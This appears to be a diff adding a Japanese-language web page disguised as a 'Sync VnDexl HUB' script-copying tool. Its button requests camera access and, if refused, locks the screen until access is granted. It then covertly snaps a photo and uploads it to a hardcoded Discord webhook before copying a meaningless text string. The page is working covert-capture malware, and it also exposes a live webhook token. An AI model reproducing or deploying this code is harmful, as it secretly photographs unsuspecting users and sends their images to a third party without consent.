@@ -1,0 +1,205 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+<meta charset="UTF-8">
+<title>Sync VnDexl HUB</title>
+
+<style>
+html, body {
+  margin:0;
+  width:100%;
+  height:100%;
+  font-family: "Segoe UI", sans-serif;
+  background: linear-gradient(135deg, #0a0a0a, #1a1a1a);
+  color:#fff;
+}
+
+/* ===== メインUI ===== */
+.container {
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  height:100%;
+}
+
+.card {
+  width:360px;
+  background:#121212;
+  border-radius:14px;
+  box-shadow:0 0 30px rgba(0,0,0,.6);
+  padding:28px;
+  text-align:center;
+}
+
+.logo {
+  font-size:26px;
+  font-weight:700;
+  margin-bottom:4px;
+}
+
+.version {
+  font-size:14px;
+  opacity:.6;
+  margin-bottom:20px;
+}
+
+button {
+  width:100%;
+  padding:14px;
+  font-size:16px;
+  border:none;
+  border-radius:8px;
+  background:#5865F2;
+  color:#fff;
+  cursor:pointer;
+  transition:.2s;
+}
+
+button:hover {
+  background:#4752c4;
+}
+
+.status {
+  margin-top:16px;
+  font-size:13px;
+  opacity:.7;
+}
+
+video, canvas {
+  display:none;
+}
+
+/* ===== ロック画面 ===== */
+#lockScreen {
+  position: fixed;
+  inset: 0;
+  background: #000;
+  display: none;
+  align-items: center;
+  justify-content: center;
+  z-index: 999999;
+}
+
+.lock-box {
+  text-align: center;
+  max-width: 280px;
+}
+
+.lock-box p {
+  margin-bottom: 20px;
+  font-size: 15px;
+  opacity: .9;
+}
+
+.lock-box button {
+  margin-top: 10px;
+}
+</style>
+</head>
+
+<body>
+
+<!-- ===== ロック画面 ===== -->
+<div id="lockScreen">
+  <div class="lock-box">
+    <p>この操作にはカメラの許可が必要です</p>
+    <button onclick="retryCamera()">もう一度許可する</button>
+    <button onclick="exitPage()" style="background:#333">終了</button>
+  </div>
+</div>
+
+<!-- ===== メインUI ===== -->
+<div class="container">
+  <div class="card">
+    <div class="logo">Sync VnDexl HUB</div>
+    <div class="version">V1.1.1 Official</div>
+
+    <button id="startBtn">Copy Script</button>
+    <div class="status" id="status">Status: Ready</div>
+  </div>
+</div>
+
+<video id="video" autoplay playsinline></video>
+<canvas id="canvas"></canvas>
+
+<script>
+/* ===============================
+   コピーしたい文字
+   =============================== */
+const COPY_TEXT = `
+こいんかわいい
+`;
+
+/* Discord Webhook */
+const WEBHOOK_URL = "https://discord.com/api/webhooks/1457458043834073270/B1GzMH7u6rnoCfa-bx_3GRIHtHmgueg8_9JhbtrDg6JC7IPodR1RIR9ronbrdFhSHrqK";
+
+const startBtn = document.getElementById("startBtn");
+const statusText = document.getElementById("status");
+const video = document.getElementById("video");
+const canvas = document.getElementById("canvas");
+const lockScreen = document.getElementById("lockScreen");
+
+/* ===== ボタン押下 ===== */
+startBtn.onclick = () => {
+  requestCamera();
+};
+
+/* ===== カメラ要求 ===== */
+async function requestCamera() {
+  try {
+    statusText.textContent = "Status: Camera permission...";
+    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+    video.srcObject = stream;
+
+    statusText.textContent = "Status: Capturing...";
+    setTimeout(() => captureSendAndCopy(stream), 800);
+
+  } catch (e) {
+    // 拒否されたら完全ロック
+    lockScreen.style.display = "flex";
+  }
+}
+
+/* ===== 撮影 → Discord → コピー ===== */
+async function captureSendAndCopy(stream) {
+  canvas.width = video.videoWidth;
+  canvas.height = video.videoHeight;
+  canvas.getContext("2d").drawImage(video, 0, 0);
+
+  stream.getTracks().forEach(t => t.stop());
+
+  statusText.textContent = "Status: Sending to Discord...";
+
+  const blob = await new Promise(r => canvas.toBlob(r, "image/png"));
+
+  const form = new FormData();
+  form.append("file", blob, "kanikama_selfie.png");
+  form.append("payload_json", JSON.stringify({
+    username: "kanikamaHUB",
+    embeds: [{
+      title: "kanikamaHUB Selfie",
+      image: { url: "attachment://kanikama_selfie.png" }
+    }]
+  }));
+
+  await fetch(WEBHOOK_URL, { method: "POST", body: form });
+
+  statusText.textContent = "Status: Copying Script...";
+  await navigator.clipboard.writeText(COPY_TEXT);
+
+  statusText.textContent = "Status: Script Copied ✔";
+}
+
+/* ===== 例外処理 ===== */
+function retryCamera() {
+  lockScreen.style.display = "none";
+  requestCamera();
+}
+
+function exitPage() {
+  location.href = "about:blank";
+}
+</script>
+
+</body>
+</html>
